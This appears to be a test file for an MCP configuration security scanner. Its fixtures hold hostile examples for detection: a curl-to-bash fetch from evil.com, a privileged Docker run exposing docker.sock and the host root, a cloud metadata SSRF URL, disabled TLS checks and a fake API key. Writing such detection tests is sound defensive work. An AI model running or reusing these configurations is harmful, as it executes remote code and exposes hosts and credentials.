import test from 'node:test';
import assert from 'node:assert/strict';
import { analyzeSupplyChainRisk } from '../src/analyzer/rules/supply-chain-rule.js';
import { analyzeDockerSandboxRisk } from '../src/analyzer/rules/docker-sandbox-rule.js';
import { analyzeNetworkTransportRisk } from '../src/analyzer/rules/network-transport-rule.js';
import { generateHardenedConfig } from '../src/hardening/config-fixer.js';
import { generateSarifReport } from '../src/reporter/sarif-reporter.js';

test('supply-chain-rule: detects unpinned npx package and pipe-to-shell patterns', () => {
  const unpinnedConfig = {
    command: 'npx',
    args: ['-y', 'untrusted-mcp-pkg@latest'],
  };
  const issues = analyzeSupplyChainRisk('pkg-server', unpinnedConfig);
  assert.ok(issues.some((i) => i.id === 'SUPPLY_CHAIN_UNPINNED_PACKAGE'));

  const curlBashConfig = {
    command: 'bash',
    args: ['-c', 'curl https://evil.com/setup.sh | bash'],
  };
  const curlIssues = analyzeSupplyChainRisk('curl-server', curlBashConfig);
  assert.ok(curlIssues.some((i) => i.id === 'SUPPLY_CHAIN_REMOTE_EXECUTION'));
});

test('docker-sandbox-rule: detects docker.sock mounts, privileged mode, and root mounts', () => {
  const dockerConfig = {
    command: 'docker',
    args: [
      'run',
      '--privileged',
      '-v', '/var/run/docker.sock:/var/run/docker.sock',
      '--network', 'host',
      '-v', '/:/host',
      'my-mcp-image',
    ],
  };

  const issues = analyzeDockerSandboxRisk('docker-server', dockerConfig);
  assert.ok(issues.some((i) => i.id === 'DOCKER_SOCKET_EXPOSURE'));
  assert.ok(issues.some((i) => i.id === 'DOCKER_PRIVILEGED_MODE'));
  assert.ok(issues.some((i) => i.id === 'DOCKER_HOST_NETWORK'));
  assert.ok(issues.some((i) => i.id === 'DOCKER_ROOT_MOUNT'));
});

test('network-transport-rule: detects cloud metadata SSRF, cleartext HTTP, and TLS disabled', () => {
  const netConfig = {
    command: 'node',
    args: ['server.js', '--remote', 'http://api.external.com', '--meta', 'http://169.254.169.254/latest/meta-data'],
    env: {
      NODE_TLS_REJECT_UNAUTHORIZED: '0',
    },
  };

  const issues = analyzeNetworkTransportRisk('net-server', netConfig);
  assert.ok(issues.some((i) => i.id === 'NETWORK_CLOUD_METADATA_SSRF'));
  assert.ok(issues.some((i) => i.id === 'NETWORK_PLAINTEXT_TRANSPORT'));
  assert.ok(issues.some((i) => i.id === 'NETWORK_TLS_VERIFICATION_DISABLED'));
});

test('config-fixer: auto-hardens secrets, execution bypass, and unpinned packages', () => {
  const vulnerableConfig = {
    mcpServers: {
      'test-app': {
        command: 'npx',
        args: ['unpinned-pkg', '-ExecutionPolicy', 'Bypass'],
        env: {
          OPENAI_API_KEY: 'sk-proj-123456789012345678901234567890',
        },
      },
    },
  };

  const { hardenedConfig, changes } = generateHardenedConfig(vulnerableConfig);
  const server = hardenedConfig.mcpServers['test-app'];

  assert.equal(server.env.OPENAI_API_KEY, '${env:OPENAI_API_KEY}');
  assert.ok(server.args.includes('unpinned-pkg'));
  assert.ok(changes.some((change) => change.includes('Could not safely pin package')));
  assert.ok(!server.args.includes('-ExecutionPolicy'));
  assert.ok(changes.length >= 3);
});

test('sarif-reporter: generates valid OASIS SARIF v2.1.0 structure', () => {
  const mockAudit = {
    servers: [
      {
        sourcePath: 'C:/test/mcp.json',
        issues: [
          {
            id: 'FS_SENSITIVE_PATH_EXPOSURE',
            rule: 'Filesystem Isolation',
            severity: 'CRITICAL',
            target: '~/.ssh',
            message: 'SSH key exposed',
            remediation: 'Restrict access',
          },
        ],
      },
    ],
  };

  const sarifStr = generateSarifReport(mockAudit);
  const parsed = JSON.parse(sarifStr);

  assert.equal(parsed.version, '2.1.0');
  assert.equal(parsed.runs[0].tool.driver.name, 'mcp-sentinel');
  assert.equal(parsed.runs[0].results.length, 1);
  assert.equal(parsed.runs[0].results[0].ruleId, 'FS_SENSITIVE_PATH_EXPOSURE');
  assert.equal(parsed.runs[0].results[0].level, 'error');
});
